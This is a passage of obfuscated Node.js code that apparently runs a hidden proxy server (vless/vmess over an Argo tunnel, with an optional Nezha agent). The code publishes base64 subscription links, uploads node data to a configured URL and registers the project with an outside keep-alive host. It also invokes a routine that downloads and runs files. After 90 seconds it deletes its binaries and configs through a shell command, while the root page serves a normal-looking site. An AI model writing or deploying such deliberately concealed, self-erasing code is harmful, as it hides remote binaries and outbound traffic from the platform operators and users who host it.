_0x5314db={_0x1ed0ce:0xa9,_0x8ef3df:0x93,_0x3f58c2:0xb6},_0x1d4c3d=_0x2485,_0x17dd76={'v':'2','ps':''+_0x367a9a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1d4c3d(0x7d),'net':'ws','type':_0x1d4c3d(_0x2e2b39._0x286b8e),'host':_0x5d7778,'path':_0x1d4c3d(0x10c),'tls':_0x1d4c3d(0xc3),'sni':_0x5d7778,'alpn':'','fp':_0x1d4c3d(0x7f)},_0x187bef=_0x1d4c3d(0x77)+UUID+'@'+CFIP+':'+CFPORT+_0x1d4c3d(0x11b)+_0x5d7778+_0x1d4c3d(_0x2e2b39._0xc5395c)+_0x5d7778+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x367a9a+_0x1d4c3d(0x70)+Buffer[_0x1d4c3d(_0x2e2b39._0x18ea0f)](JSON[_0x1d4c3d(_0x2e2b39._0x12527d)](_0x17dd76))[_0x1d4c3d(0xa9)]('base64')+_0x1d4c3d(_0x2e2b39._0x45a927)+UUID+'@'+CFIP+':'+CFPORT+_0x1d4c3d(_0x2e2b39._0x3b045f)+_0x5d7778+_0x1d4c3d(0xe3)+_0x5d7778+_0x1d4c3d(0xaa)+_0x367a9a+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](_0x187bef)[_0x1d4c3d(_0x2e2b39._0x48c078)]('base64')),fs['writeFileSync'](subPath,Buffer[_0x1d4c3d(0x88)](_0x187bef)['toString'](_0x1d4c3d(0x91))),console[_0x1d4c3d(_0x2e2b39._0x3a247c)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x1d4c3d(0xee)]('/'+SUB_PATH,(_0x586e56,_0x4378b2)=>{const _0x2ea16d=_0x1d4c3d,_0x4770d0=Buffer[_0x2ea16d(0x88)](_0x187bef)[_0x2ea16d(_0x5314db._0x1ed0ce)]('base64');_0x4378b2[_0x2ea16d(_0x5314db._0x8ef3df)]('Content-Type',_0x2ea16d(_0x5314db._0x3f58c2)),_0x4378b2[_0x2ea16d(0x80)](_0x4770d0);}),_0x31bc72(_0x187bef);},0x7d0);});}}async function uploadNodes(){const _0x14bcdc={_0x159572:0x134,_0x249f84:0x79,_0x23e501:0x73,_0x4e39c7:0xdf,_0x844e0c:0x110,_0x134a3a:0xda,_0x2e859b:0x85,_0x1205bf:0xcc},_0x5e2643=_0x2a078c;if(UPLOAD_URL&&PROJECT_URL){const _0xd2487d=PROJECT_URL+'/'+SUB_PATH,_0x34a70d={'subscription':[_0xd2487d]};try{const _0xc249c7=await axios[_0x5e2643(_0x14bcdc._0x159572)](UPLOAD_URL+_0x5e2643(0x12e),_0x34a70d,{'headers':{'Content-Type':_0x5e2643(_0x14bcdc._0x249f84)}});return _0xc249c7&&_0xc249c7[_0x5e2643(0xdf)]===0xc8?(console[_0x5e2643(0x131)](_0x5e2643(0x101)),_0xc249c7):null;}catch(_0x45bf7d){if(_0x45bf7d['response']){if(_0x45bf7d[_0x5e2643(_0x14bcdc._0x23e501)][_0x5e2643(_0x14bcdc._0x4e39c7)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x5e2643(_0x14bcdc._0x844e0c)](listPath))return;const _0x9ce76=fs['readFileSync'](listPath,_0x5e2643(0x10d)),_0x33f43d=_0x9ce76['split']('\x0a')[_0x5e2643(_0x14bcdc._0x134a3a)](_0x1cb6bd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5e2643(0x8f)](_0x1cb6bd));if(_0x33f43d[_0x5e2643(0xad)]===0x0)return;const _0x375f45=JSON[_0x5e2643(_0x14bcdc._0x2e859b)]({'nodes':_0x33f43d});try{const _0x115d98=await axios[_0x5e2643(0x134)](UPLOAD_URL+_0x5e2643(_0x14bcdc._0x1205bf),_0x375f45,{'headers':{'Content-Type':_0x5e2643(0x79)}});return _0x115d98&&_0x115d98[_0x5e2643(_0x14bcdc._0x4e39c7)]===0xc8?(console[_0x5e2643(0x131)](_0x5e2643(0xc1)),_0x115d98):null;}catch(_0xee639e){return null;}}else return;}}function cleanFiles(){const _0x668308={_0x1fb3e7:0xfa,_0x5c2552:0x135,_0x3882d5:0x84},_0x4ecabd={_0x2dbd99:0x131,_0x1ea4c2:0x131,_0xd44da8:0x98};setTimeout(()=>{const _0x1dd1a4={_0x406615:0x127,_0x2b34b7:0x131},_0x15a2e0=_0x2485,_0x20111c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x20111c[_0x15a2e0(0x125)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x20111c[_0x15a2e0(0x125)](phpPath);process[_0x15a2e0(0xfb)]===_0x15a2e0(0x129)?exec(_0x15a2e0(_0x668308._0x1fb3e7)+_0x20111c[_0x15a2e0(0xbc)]('\x20')+_0x15a2e0(_0x668308._0x5c2552),_0x429865=>{const _0x35ceb9=_0x15a2e0;console[_0x35ceb9(_0x1dd1a4._0x406615)](),console[_0x35ceb9(_0x1dd1a4._0x2b34b7)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x15a2e0(0x12b)+_0x20111c[_0x15a2e0(0xbc)]('\x20')+_0x15a2e0(_0x668308._0x3882d5),_0x1cee23=>{const _0xcbbc6f=_0x15a2e0;console[_0xcbbc6f(0x127)](),console[_0xcbbc6f(_0x4ecabd._0x2dbd99)]('App\x20is\x20running'),console[_0xcbbc6f(_0x4ecabd._0x1ea4c2)](_0xcbbc6f(_0x4ecabd._0xd44da8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x468468={_0x4621e0:0x112,_0xd7fdae:0x134,_0x28f1be:0x79,_0x2e2745:0xf8,_0x48bd26:0x9d},_0x11d9f7=_0x2a078c;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x11d9f7(_0x468468._0x4621e0));return;}try{const _0x12bddc=await axios[_0x11d9f7(_0x468468._0xd7fdae)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x11d9f7(_0x468468._0x28f1be)}});return console[_0x11d9f7(0x131)](_0x11d9f7(_0x468468._0x2e2745)),_0x12bddc;}catch(_0x2227f7){return console['error'](_0x11d9f7(0xb0)+_0x2227f7[_0x11d9f7(_0x468468._0x48bd26)]),null;}}async function startserver(){const _0x3361a5={_0x52400c:0xbe},_0x3ee86e=_0x2a078c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x492369){console[_0x3ee86e(0x126)](_0x3ee86e(_0x3361a5._0x52400c),_0x492369);}}startserver()[_0x2a078c(0xb8)](_0x43eea2=>{const _0x4601ef={_0x3a366c:0x75},_0x26ddf6=_0x2a078c;console[_0x26ddf6(0x126)](_0x26ddf6(_0x4601ef._0x3a366c),_0x43eea2);}),app['get']('/',async function(_0x4c32c6,_0x1e7fe5){const _0xf86c49={_0x348188:0xd1,_0x25521b:0x81,_0x1a59d3:0xdd,_0x3b993c:0x80,_0xa68acd:0xa3},_0x4d8b3b=_0x2a078c;try{const _0x2efcdb=path['join'](__dirname,_0x4d8b3b(_0xf86c49._0x348188)),_0x15478b=await fs[_0x4d8b3b(0x9b)][_0x4d8b3b(_0xf86c49._0x25521b)](_0x2efcdb,_0x4d8b3b(_0xf86c49._0x1a59d3));_0x1e7fe5['send'](_0x15478b);}catch(_0x36d240){_0x1e7fe5[_0x4d8b3b(_0xf86c49._0x3b993c)](_0x4d8b3b(_0xf86c49._0xa68acd));}}),app[_0x2a078c(0xb2)](PORT,()=>console[_0x2a078c(0x131)](_0x2a078c(0xde)+PORT+'!'));
